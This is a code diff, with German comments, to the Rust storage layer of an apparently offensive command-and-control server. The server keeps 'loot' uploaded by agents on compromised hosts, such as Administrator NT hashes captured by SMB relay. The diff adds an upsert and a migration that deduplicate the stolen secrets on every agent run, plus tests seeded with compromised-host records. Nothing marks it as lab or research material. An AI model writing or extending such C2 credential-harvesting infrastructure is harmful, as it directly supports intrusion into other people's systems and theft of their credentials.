@@ -7,6 +7,11 @@
 //! `TaskRow`), ohne serde — sie werden per Positionsindex gelesen, nicht
 //! serialisiert. Die Wire-Typen besitzt `kx_core::c2`; die Umwandlung passiert
 //! über die `From`-Implementierungen am Dateiende.
+//!
+//! Die Tabelle `secrets` haelt die Beute ohne Duplikate. Die fachliche
+//! Identitaet eines Secrets ist `(host_id, cred_type, username, source)`; ein
+//! wiederholter Upload — der Agent meldet dieselben Secrets bei jedem Lauf
+//! erneut — aktualisiert die bekannte Zeile, statt eine zweite anzulegen.
 
 use std::path::Path;
 use std::sync::Mutex;
@@ -101,9 +106,42 @@ impl Db {
         Self::ergaenze_spalten(&conn, "hosts", &[("sealed_master", "TEXT")])?;
         Self::ergaenze_spalten(&conn, "secrets", &[("sealed_password", "TEXT")])?;
 
+        // Die Tabelle `secrets` bekommt erst hier ihre fachliche Identitaet:
+        // ohne den UNIQUE-Index kann der Upsert keinen Konflikt erkennen.
+        Self::migriere_secrets(&conn)?;
+
         Ok(Self {
             conn: Mutex::new(conn),
         })
+    }
+
+    /// Gibt der `secrets`-Tabelle ihre fachliche Identitaet.
+    ///
+    /// Zwei Schritte, in dieser Reihenfolge:
+    ///
+    /// 1. Duplikate entfernen. `MAX(rowid)` behaelt je Gruppe die juengste
+    ///    Zeile — nur deren Chiffretext passt zum aktuellen Master-Key des
+    ///    Hosts, weil der Agent pro Lauf einen neuen kapselt.
+    /// 2. Den UNIQUE-Index anlegen. Er macht `(host_id, cred_type, username,
+    ///    source)` zur eindeutigen Identitaet eines Secrets.
+    ///
+    /// Die Reihenfolge ist zwingend: ein `CREATE UNIQUE INDEX` auf der bereits
+    /// gefuellten Tabelle schlaegt mit "UNIQUE constraint failed" fehl.
+    ///
+    /// Beide Schritte sind idempotent — auf einer frischen, leeren Datenbank
+    /// sind sie No-Ops.
+    fn migriere_secrets(conn: &Connection) -> Result<(), DbError> {
+        conn.execute(
+            "DELETE FROM secrets WHERE rowid NOT IN
+               (SELECT MAX(rowid) FROM secrets GROUP BY host_id, cred_type, username, source)",
+            [],
+        )?;
+        conn.execute(
+            "CREATE UNIQUE INDEX IF NOT EXISTS idx_secrets_identitaet
+               ON secrets(host_id, cred_type, username, source)",
+            [],
+        )?;
+        Ok(())
     }
 
     /// Ergaenzt Spalten, die eine aeltere Datenbank noch nicht hat.
@@ -215,13 +253,21 @@ impl Db {
                 status: r.get(4)?,
                 first_seen: r.get(5)?,
                 last_seen: r.get(6)?,
-                sealed_master: r.get(7)?,
+                // `sealed_master` wurde per `ALTER TABLE` nachgezogen — die
+                // Zeilen, die schon davor da waren, tragen dort NULL. Der
+                // Leser muss das aushalten, sonst faellt die Liste aus.
+                sealed_master: r.get::<_, Option<String>>(7)?.unwrap_or_default(),
             })
         })?;
         rows.collect::<Result<Vec<_>, _>>().map_err(Into::into)
     }
 
-    /// Speichert ein neues Secret.
+    /// Speichert ein Secret — neu, oder aktualisiert das bekannte.
+    ///
+    /// Die fachliche Identitaet eines Secrets ist `(host_id, cred_type,
+    /// username, source)`. Der Agent meldet dieselben Secrets bei jedem Lauf
+    /// erneut; ein reiner INSERT liess die Tabelle deshalb um Zeilen pro
+    /// Minute wachsen. Der Upsert aktualisiert statt zu verdoppeln.
     ///
     /// Kommt das Secret versiegelt an, wird der Klartext verworfen — auf dem
     /// C2 liegt die Beute dann nur noch verschluesselt. Ohne Siegel (Agent
@@ -230,7 +276,7 @@ impl Db {
     ///
     /// Diese Regel steht neben der Zeile, die sie betrifft, und nicht im
     /// Handler: sie ist eine Eigenschaft der Ablage, nicht des HTTP.
-    pub fn insert_secret(&self, upload: &c2::SecretUpload) -> Result<(), DbError> {
+    pub fn upsert_secret(&self, upload: &c2::SecretUpload) -> Result<(), DbError> {
         let sealed_password = upload.sealed_password.clone().unwrap_or_default();
         let password = if sealed_password.is_empty() {
             upload.password.clone()
@@ -247,13 +293,17 @@ impl Db {
             collected_at: kx_core::util::now_rfc3339(),
             versiegelt: sealed_password,
         };
-        self.insert_secret_row(&row)
+        self.upsert_secret_row(&row)
     }
 
-    fn insert_secret_row(&self, s: &SecretRow) -> Result<(), DbError> {
+    fn upsert_secret_row(&self, s: &SecretRow) -> Result<(), DbError> {
         self.conn.lock().unwrap().execute(
             "INSERT INTO secrets (id, host_id, cred_type, username, password, source, collected_at, sealed_password)
-             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)",
+             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)
+             ON CONFLICT(host_id, cred_type, username, source) DO UPDATE SET
+               collected_at = excluded.collected_at,
+               password = excluded.password,
+               sealed_password = excluded.sealed_password",
             params![
                 s.id,
                 s.host_id,
@@ -291,7 +341,10 @@ impl Db {
                 password: r.get(4)?,
                 source: r.get(5)?,
                 collected_at: r.get(6)?,
-                versiegelt: r.get(7)?,
+                // `sealed_password` wurde per `ALTER TABLE` nachgezogen — die
+                // Zeilen, die schon davor da waren, tragen dort NULL. Der
+                // Leser muss das aushalten, sonst faellt die Liste aus.
+                versiegelt: r.get::<_, Option<String>>(7)?.unwrap_or_default(),
             })
         })?;
         rows.collect::<Result<Vec<_>, _>>().map_err(Into::into)
@@ -543,5 +596,233 @@ mod tests {
         assert_eq!(wire.host_id, "10.0.0.5");
         assert_eq!(wire.cred_type, "nt_hash");
         assert_eq!(wire.source, "smb_relay");
+    }
+
+    /// Der Agent meldet dieselben Secrets bei jedem Lauf erneut. Der zweite
+    /// Upload darf deshalb keine zweite Zeile anlegen — er aktualisiert die
+    /// bekannte. Sonst wuchs die Tabelle um Zeilen pro Minute.
+    #[test]
+    fn derselbe_upload_legt_keine_zweite_zeile_an() {
+        let dir = std::env::temp_dir();
+        let path = dir.join(format!("kx-secret-upsert-{}.db", uuid::Uuid::new_v4()));
+        let db = Db::open(&path).expect("db");
+
+        let upload = c2::SecretUpload {
+            host_id: "10.0.0.5".into(),
+            cred_type: "nt_hash".into(),
+            username: "Administrator".into(),
+            password: String::new(),
+            source: Some("smb_relay".into()),
+            master_key: None,
+            sealed_password: None,
+        }
+        .mit_versiegeltem_passwort(Some("kx1:ersterlauf".into()));
+        db.upsert_secret(&upload).expect("erster Upload");
+        let erste = db.list_secrets().expect("secrets");
+        assert_eq!(erste.len(), 1);
+
+        // Der zweite Lauf kapselt einen neuen Master-Key — der Chiffretext
+        // muss mitlaufen, sonst waere die Zeile kryptografisch tot.
+        let zweiter = upload
+            .clone()
+            .mit_versiegeltem_passwort(Some("kx1:zweiterlauf".into()));
+        db.upsert_secret(&zweiter).expect("zweiter Upload");
+
+        let zweite = db.list_secrets().expect("secrets");
+        assert_eq!(
+            zweite.len(),
+            1,
+            "der wiederholte Upload hat eine zweite Zeile angelegt"
+        );
+        assert_eq!(zweite[0].id, erste[0].id, "die ID der Zeile ist gewandert");
+        assert_eq!(zweite[0].sealed_password, "kx1:zweiterlauf");
+
+        std::fs::remove_file(&path).ok();
+    }
+
+    /// Der Upsert haelt die ID der Zeile und uebernimmt den Zeitstempel und
+    /// den versiegelten Wert des juengsten Laufs. Geprueft wird das an der
+    /// Zeile direkt, damit der Zeitstempel nicht vom Sekunden-Takt der
+    /// Systemuhr abhaengt.
+    #[test]
+    fn der_upsert_uebernimmt_zeitstempel_und_siegel_des_jungsten_laufs() {
+        let dir = std::env::temp_dir();
+        let path = dir.join(format!("kx-secret-zeile-{}.db", uuid::Uuid::new_v4()));
+        let db = Db::open(&path).expect("db");
+
+        let mut row = SecretRow {
+            id: "s-1".into(),
+            host_id: "10.0.0.5".into(),
+            cred_type: "nt_hash".into(),
+            username: "Administrator".into(),
+            password: String::new(),
+            source: "smb_relay".into(),
+            collected_at: "2026-11-11T00:00:00Z".into(),
+            versiegelt: "kx1:ersterlauf".into(),
+        };
+        db.upsert_secret_row(&row).expect("erster Upload");
+
+        // Der zweite Lauf bringt eine eigene ID mit — die Zeile darf sie
+        // trotzdem nicht uebernehmen.
+        row.id = "s-2".into();
+        row.collected_at = "2026-11-11T00:05:00Z".into();
+        row.versiegelt = "kx1:zweiterlauf".into();
+        db.upsert_secret_row(&row).expect("zweiter Upload");
+
+        let secrets = db.list_secrets().expect("secrets");
+        assert_eq!(secrets.len(), 1, "es sind zwei Zeilen entstanden");
+        assert_eq!(secrets[0].id, "s-1", "die ID der Zeile ist gewandert");
+        assert_eq!(secrets[0].collected_at, "2026-11-11T00:05:00Z");
+        assert_eq!(secrets[0].sealed_password, "kx1:zweiterlauf");
+
+        std::fs::remove_file(&path).ok();
+    }
+
+    /// Eine andere Identitaet ist ein anderes Secret und bekommt eine eigene
+    /// Zeile — der Upsert darf nicht zu weit greifen.
+    #[test]
+    fn eine_andere_identitaet_bekommt_ihre_eigene_zeile() {
+        let dir = std::env::temp_dir();
+        let path = dir.join(format!("kx-secret-andere-{}.db", uuid::Uuid::new_v4()));
+        let db = Db::open(&path).expect("db");
+
+        let upload = c2::SecretUpload {
+            host_id: "10.0.0.5".into(),
+            cred_type: "nt_hash".into(),
+            username: "Administrator".into(),
+            password: String::new(),
+            source: Some("smb_relay".into()),
+            master_key: None,
+            sealed_password: None,
+        }
+        .mit_versiegeltem_passwort(Some("kx1:siegel".into()));
+        db.upsert_secret(&upload).expect("erster Upload");
+
+        // Gleicher Host, gleicher Typ, gleiche Quelle — nur ein anderer
+        // Benutzername. Das ist ein anderes Secret.
+        let mut anderer = upload.clone();
+        anderer.username = "root".into();
+        db.upsert_secret(&anderer).expect("zweiter Upload");
+
+        let secrets = db.list_secrets().expect("secrets");
+        assert_eq!(secrets.len(), 2);
+        assert!(secrets.iter().all(|s| s.host_id == "10.0.0.5"));
+
+        std::fs::remove_file(&path).ok();
+    }
+
+    /// Die Migration laeuft auf einer bereits gefuellten Datenbank durch:
+    /// von Hand duplizierte Zeilen werden entfernt, und je Gruppe bleibt
+    /// genau die juengste — nur deren Chiffretext passt zum aktuellen
+    /// Master-Key des Hosts.
+    #[test]
+    fn die_migration_bereinigt_eine_gefuellte_datenbank() {
+        let dir = std::env::temp_dir();
+        let path = dir.join(format!("kx-secret-migration-{}.db", uuid::Uuid::new_v4()));
+
+        // Eine Datenbank im alten Zustand: Tabelle ohne UNIQUE-Index, mit
+        // zwei Zeilen derselben Identitaet.
+        {
+            let conn = Connection::open(&path).expect("conn");
+            conn.execute_batch(
+                "CREATE TABLE IF NOT EXISTS secrets (
+                    id TEXT PRIMARY KEY, host_id TEXT, cred_type TEXT,
+                    username TEXT, password TEXT, source TEXT, collected_at TEXT,
+                    sealed_password TEXT
+                );
+                INSERT INTO secrets (id, host_id, cred_type, username, password, source,
+                    collected_at, sealed_password)
+                    VALUES ('alt-1','10.0.0.5','nt_hash','Administrator','','smb_relay',
+                        '2026-11-11T00:00:00Z','kx1:alt');
+                INSERT INTO secrets (id, host_id, cred_type, username, password, source,
+                    collected_at, sealed_password)
+                    VALUES ('alt-2','10.0.0.5','nt_hash','Administrator','','smb_relay',
+                        '2026-11-11T00:05:00Z','kx1:juenger');
+                INSERT INTO secrets (id, host_id, cred_type, username, password, source,
+                    collected_at, sealed_password)
+                    VALUES ('anders','10.0.0.5','password','root','','default_creds',
+                        '2026-11-11T00:06:00Z','kx1:anders');",
+            )
+            .expect("seed");
+        }
+
+        let db = Db::open(&path).expect("db");
+        let secrets = db.list_secrets().expect("secrets");
+        assert_eq!(secrets.len(), 2, "die Duplikate wurden nicht entfernt");
+
+        let juenger = secrets
+            .iter()
+            .find(|s| s.cred_type == "nt_hash")
+            .expect("die juengere Zeile der Gruppe");
+        assert_eq!(
+            juenger.id, "alt-2",
+            "die juengere Zeile hat nicht ueberlebt"
+        );
+        assert_eq!(juenger.sealed_password, "kx1:juenger");
+        assert!(
+            secrets.iter().any(|s| s.cred_type == "password"),
+            "die andere Gruppe ist verschwunden"
+        );
+
+        // Der UNIQUE-Index steht: ohne ihn kaeme der Upsert nicht durch.
+        let indexe: i64 = db
+            .conn
+            .lock()
+            .unwrap()
+            .query_row(
+                "SELECT count(*) FROM sqlite_master WHERE type='index' AND name='idx_secrets_identitaet'",
+                [],
+                |r| r.get(0),
+            )
+            .expect("index");
+        assert_eq!(indexe, 1, "der UNIQUE-Index fehlt");
+
+        std::fs::remove_file(&path).ok();
+    }
+
+    /// Eine Datenbank aus einer aelteren Version kennt die Spalten
+    /// `sealed_master` und `sealed_password` nicht. `ALTER TABLE` traegt sie
+    /// nach — die Zeilen, die schon davor da waren, tragen dort NULL. Der
+    /// Leser muss das aushalten: sonst liefert die Liste einen 500, und der
+    /// Server waere nach der Migration nicht benutzbar.
+    #[test]
+    fn eine_aeltere_datenbank_ohne_die_nachgezogenen_spalten_liefert_zeilen() {
+        let dir = std::env::temp_dir();
+        let path = dir.join(format!("kx-secret-alt-schema-{}.db", uuid::Uuid::new_v4()));
+
+        {
+            let conn = Connection::open(&path).expect("conn");
+            conn.execute_batch(
+                "CREATE TABLE IF NOT EXISTS hosts (
+                    id TEXT PRIMARY KEY, ip TEXT, hostname TEXT, os TEXT,
+                    status TEXT, first_seen TEXT, last_seen TEXT
+                );
+                CREATE TABLE IF NOT EXISTS secrets (
+                    id TEXT PRIMARY KEY, host_id TEXT, cred_type TEXT,
+                    username TEXT, password TEXT, source TEXT, collected_at TEXT
+                );
+                INSERT INTO hosts (id, ip, hostname, os, status, first_seen, last_seen)
+                    VALUES ('10.0.0.5','10.0.0.5','ziel','Linux','compromised',
+                        '2026-11-11T00:00:00Z','2026-11-11T00:00:00Z');
+                INSERT INTO secrets (id, host_id, cred_type, username, password, source,
+                    collected_at)
+                    VALUES ('alt-1','10.0.0.5','nt_hash','Administrator','','smb_relay',
+                        '2026-11-11T00:00:00Z');",
+            )
+            .expect("seed");
+        }
+
+        let db = Db::open(&path).expect("db");
+
+        let hosts = db.list_hosts().expect("hosts");
+        assert_eq!(hosts.len(), 1);
+        assert_eq!(hosts[0].sealed_master, "");
+
+        let secrets = db.list_secrets().expect("secrets");
+        assert_eq!(secrets.len(), 1);
+        assert_eq!(secrets[0].id, "alt-1");
+        assert_eq!(secrets[0].sealed_password, "");
+
+        std::fs::remove_file(&path).ok();
     }
 }
